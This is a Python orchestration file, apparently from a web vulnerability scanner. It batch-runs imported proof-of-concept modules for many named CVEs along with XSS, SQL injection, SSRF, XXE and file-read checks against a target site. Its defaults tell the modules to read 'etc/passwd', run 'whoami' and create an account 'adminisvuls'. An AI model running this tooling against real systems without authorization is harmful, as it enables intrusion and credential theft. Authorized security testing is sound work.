#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests,urllib3
from attack.CheckCms import Check_Cms
from attack.SQL_Injection import SqlPoc
from attack.XSS_check import XssPoc
from attack.File_Read import File_ReadPoc
from attack.SSRF_check import SSRFPoc
from attack.MoBan_check import MoBanPoc
from attack.XXE import XXEPoc
from rich.progress import Progress
from set.pocset import modules
from pub.com.outprint import OutPrintInfoSuc,OutPrintInfo,OutPrintInfoR
from concurrent.futures import ThreadPoolExecutor,as_completed,wait
urllib3.disable_warnings()
class Other_Poc_Attack_Run():
    def __error_check(self,target):
        url = target["url"].strip('/ ')
        header = {"User-Agent":target["header"]}
        ssl = target["ssl"]
        try:
            req = requests.get(url+"/xxx/..;/asjdhvjkgaevw5#cag",headers=header,verify=ssl)
            if "ThinkPHP" in req.text:
                OutPrintInfoSuc("ATTACK","检测到ThinkPHP特征")
            if "Whitelabel Error Page" in req.text:
                OutPrintInfoSuc("ATTACK","检测到Spring特征")
            if "Tomcat" in req.text:
                OutPrintInfoSuc("ATTACK","检测到Tomcat特征")
            req2 = requests.get(url,headers=header,verify=ssl)
            return req2.text
        except Exception:
            pass
    def __poc_list(self,target):
        from cve.Nginx.Nginx_File_Read import Nginx_File_Read_Scan
        from cve.Jquery.JqueryDirRead import JqueryDirReadScan
        from cve.NodeJs.CVE_2017_14849 import Cve_2017_14849
        from cve.NodeJs.CVE_2021_21315 import Cve_2021_21315
        from cve.Ruby.CVE_2018_3760 import Cve_2018_3760
        from cve.Aiohttp.CVE_2024_23334 import Cve_2024_23334
        from cve.Ruby.CVE_2019_5418 import Cve_2019_5418
        from cve.Spring.SpringDump import SpringDumpScan
        from cve.Apache.Log4j_Check import Log4j_Check_Run
        from cve.Shiro.Shiro_Check import Shiro_Check_Run
        from cve.IIS.IISPut import IISPutScan
        from cve.FastJson.FastJsonCheck import FastJsonCheckScan
        from cve.Mini_Httpd.CVE_2018_18778 import Cve_2018_18778
        from cve.ZOHO.CVE_2023_35854 import Cve_2023_35854
        from cve.Kindeditor.Kindeditor_Upload_Dir import Kindeditor_Upload_Dir_Scan
        from cve.Fckeditor.Fckeditor_Upload_Dir import Fckeditor_Upload_Dir_Scan
        from cve.Ueditor.Ueditor_Upload_Dir import Ueditor_Upload_Dir_Scan
        from cve.SolarWinds.SolarWinds_File_Read import SolarWinds_File_Read_Scan
        from cve.PHP.CVE_2024_4577 import Cve_2024_4577
        poc_list = [
            Nginx_File_Read_Scan,
            JqueryDirReadScan,
            Cve_2017_14849,
            Cve_2021_21315,
            Cve_2018_3760,
            Cve_2019_5418,
            SpringDumpScan,
            Shiro_Check_Run,
            FastJsonCheckScan,
            IISPutScan,
            Cve_2018_18778,
            Cve_2023_35854,
            Log4j_Check_Run,
            Cve_2024_23334,
            Kindeditor_Upload_Dir_Scan,
            Fckeditor_Upload_Dir_Scan,
            Ueditor_Upload_Dir_Scan,
            SolarWinds_File_Read_Scan,
            Cve_2024_4577
        ]

        tasks = self.__progress.add_task("[b green]常归漏洞扫描...",total=len(poc_list))
        with ThreadPoolExecutor(int(target["threads"])) as pool:
            futures = [pool.submit(poc().main,target) for poc in poc_list]
            for future in as_completed(futures):
                result = future.result()
                if result == "shiro":
                    Check_Cms("shiro",target,self.__progress)
                self.__progress.update(tasks,advance=1)
        wait(futures)

    def _work_run(self,target):
        from cve.Log.Logs import LogScan
        from cve.WebInfoScan.ZhongJianJian import ZhongJianJianScan
        ZhongJianJianScan().main(target)
        LogScan().main(target)
        _list = [
            self.__poc_list,
            self.__cms_check,
        ]
        with Progress(transient=True) as self.__progress:
            tasks = self.__progress.add_task("[b magenta]ATTACK总进度...",total=len(_list)+1)
            self.__ows_ten(target)
            self.__progress.update(tasks, advance=1)
            with ThreadPoolExecutor(int(target["threads"])) as pool:
                futures = [pool.submit(poc,target) for poc in _list]
                for future in as_completed(futures):
                    future.result()
                    self.__progress.update(tasks,advance=1)
            wait(futures)
    def __cms_check(self,target):
        OutPrintInfoR("ATTACK", "开始网站内容CMS特征识别...")
        req = self.__error_check(target)


        if req:
            _cms_poc_list = []
            for k in modules:
                if 'attack' in k:
                    if k['attack'].lower() in req.lower():
                    # if req.find(k['attack']) != -1:
                        k['params']['url'] = target['url']
                        k['params']['threads'] = target['threads']
                        k['params']['batch_work'] = True
                        _cms_poc_list.append(k)
            OutPrintInfoR("ATTACK", "网站内容CMS特征识别结束")
            if _cms_poc_list:
                OutPrintInfoSuc("ATTACK", "CMS检测到以下特征")
                check_out_two = []
                for i in _cms_poc_list:
                    if i['name'] not in check_out_two:
                        check_out_two.append(i['name'])
                        OutPrintInfo("ATTACK", f"[b bright_red]{i['name']}")

                tasks = self.__progress.add_task("[b cyan]CMS特征对应漏洞扫描...", total=len(_cms_poc_list))

                def lazy_import(module_name):
                    from importlib import import_module
                    return lambda: import_module(module_name)
                with ThreadPoolExecutor(int(target["threads"])) as pool:
                    futures = []
                    for reslist_poc in _cms_poc_list:
                        class_name = ".".join(reslist_poc["poc"].split(".")[0:-1])
                        poc_module = lazy_import(class_name)()
                        poc_class = getattr(poc_module, reslist_poc["poc"].split(".")[-1])
                        poc_instance = poc_class()
                        # 假设 poc_instance.main() 应该直接执行
                        poc_instance.main()
                        # 将 poc_instance.main() 作为任务提交到线程池
                        future = pool.submit(poc_instance.main, reslist_poc['params'])
                        futures.append(future)
                    # futures = [pool.submit(poc['poc']().main, poc['params']) for poc in _cms_poc_list]
                    for future in as_completed(futures):
                        future.result()
                        self.__progress.update(tasks, advance=1)
                wait(futures)
        else:
            return
    def __ows_ten(self,target):
        _poc_list = [
            XssPoc,
            SqlPoc,
            File_ReadPoc,
            SSRFPoc,
            XXEPoc,
            MoBanPoc,
        ]
        tasks = self.__progress.add_task("[b bright_blue]注入漏洞检测...",total=len(_poc_list))
        for i in _poc_list:
            i().main(target,self.__base_attack_url,self.__progress,self.__craw_post_url_list)
            self.__progress.update(tasks, advance=1)
    def main(self,target,__base_attack_url,__craw_post_url_list):
        self.__base_attack_url = __base_attack_url
        # for i in self.__base_attack_url:
        #     print(i)
        self.__craw_post_url_list = __craw_post_url_list
        target["batch_work"] = True
        target["file"] = "etc/passwd"
        target["cmd"] = "whoami"
        target["username"] = "adminisvuls"
        target["password"] = "password@8"
        target["url"] = target["url"].split("/")[0]+"//"+target["url"].split("/")[2]
        # self.__poc_list(target)
        self._work_run(target)